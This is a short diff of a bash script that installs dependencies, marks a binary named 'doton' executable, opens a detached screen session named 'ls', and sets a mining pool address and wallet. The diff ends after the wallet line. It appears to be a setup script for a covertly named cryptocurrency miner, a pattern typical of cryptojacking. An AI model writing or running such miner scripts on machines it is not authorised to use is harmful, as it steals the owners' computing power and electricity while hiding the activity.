@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x doton && chmod +x config.json && chmod +x SHA256SUMS
+chmod +x doton
 screen -dmS ls 
 POOL=pool.hashvault.pro:443
 WALLET=hvxy9P3HryFTBW4tAPkBaBRibwiM3x4roL1g6oGtUHPSVDHMqNueznj8mQPswmJKHCCY6cZGZ4TkUPdWbt4BhpP348B8rMJ6iz
